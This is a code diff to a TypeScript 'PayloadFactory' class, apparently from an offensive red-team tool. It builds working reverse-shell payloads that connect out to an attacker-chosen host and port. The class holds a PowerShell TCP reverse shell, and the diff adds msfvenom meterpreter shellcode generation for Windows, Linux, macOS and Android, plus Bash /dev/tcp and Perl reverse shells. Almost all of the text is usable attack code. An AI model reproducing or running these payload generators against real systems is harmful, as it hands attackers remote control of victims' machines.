@@ -5,6 +5,7 @@
 import * as fs from 'fs';
 import * as path from 'path';
 import { execSync } from 'child_process';
+import { isWindows, isLinux } from './platform';
 
 export class PayloadFactory {
   private dataDir: string;
@@ -17,7 +18,7 @@ export class PayloadFactory {
   }
 
   /**
-   * Generate a PowerShell one-liner reverse shell
+   * Generate a PowerShell one-liner reverse shell (Windows targets)
    */
   generatePs1(lhost: string, lport: number, kind: string): string {
     const base = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
@@ -76,22 +77,60 @@ class Program {
   }
 
   /**
-   * Generate shellcode payload via MSF (if available) or return a placeholder
+   * Generate shellcode via msfvenom (cross-platform)
+   * Windows: uses WSL msfvenom | macOS/Linux: native msfvenom
    */
-  generateShellcode(lhost: string, lport: number, arch: string): string {
-    // Try to use msfvenom if available
+  generateShellcode(lhost: string, lport: number, arch: string, targetPlatform?: string): string {
+    const a = arch === 'x64' ? 'x64' : 'x86';
+    const tp = targetPlatform || 'windows'; // default: windows target
+
+    const buildCmd = (payload: string): string => {
+      return `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f base64 2>/dev/null`;
+    };
+
+    // Pick the right payload for the target
+    const payloadMap: Record<string, string> = {
+      'windows': `windows/${a}/meterpreter/reverse_tcp`,
+      'linux': `linux/${a}/meterpreter/reverse_tcp`,
+      'macos': `osx/${a}/meterpreter_reverse_tcp`,
+      'android': `android/meterpreter/reverse_tcp`,
+    };
+    const payload = payloadMap[tp] || payloadMap['windows'];
+
     try {
-      const archFlag = arch === 'x64' ? 'x64' : 'x86';
-      const platform = 'windows';
-      const result = execSync(
-        `msfvenom -p windows/${archFlag}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f base64 2>/dev/null`,
-        { timeout: 15000, encoding: 'utf-8' }
-      );
+      let cmd: string;
+      if (isWindows()) {
+        cmd = `wsl ${buildCmd(payload)}`;
+      } else {
+        cmd = buildCmd(payload);
+      }
+      const result = execSync(cmd, { timeout: 30000, encoding: 'utf-8', shell: isWindows() ? undefined : '/bin/bash' });
       return result.trim();
     } catch {
-      // Fallback: return a placeholder with msfvenom command
-      return `# Run locally to generate shellcode:\nmsfvenom -p windows/${arch === 'x64' ? 'x64/' : ''}meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f c\n\n# Or use base64 format:\nmsfvenom -p windows/${arch === 'x64' ? 'x64/' : ''}meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f base64`;
+      return [
+        `# msfvenom not found. Install Metasploit or run manually:`,
+        `#   ${buildCmd(payload)}`,
+        `#`,
+        `# For Linux target:`,
+        `#   msfvenom -p linux/${a}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf > shell.elf`,
+        `# For macOS target:`,
+        `#   msfvenom -p osx/${a}/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f macho > shell.macho`,
+      ].join('\n');
     }
+  }
+
+  /**
+   * Generate a Bash reverse shell one-liner (Linux targets)
+   */
+  generateBash(lhost: string, lport: number): string {
+    return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  }
+
+  /**
+   * Generate a Perl reverse shell (Linux/Unix targets)
+   */
+  generatePerl(lhost: string, lport: number): string {
+    return `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
   }
 
   /**
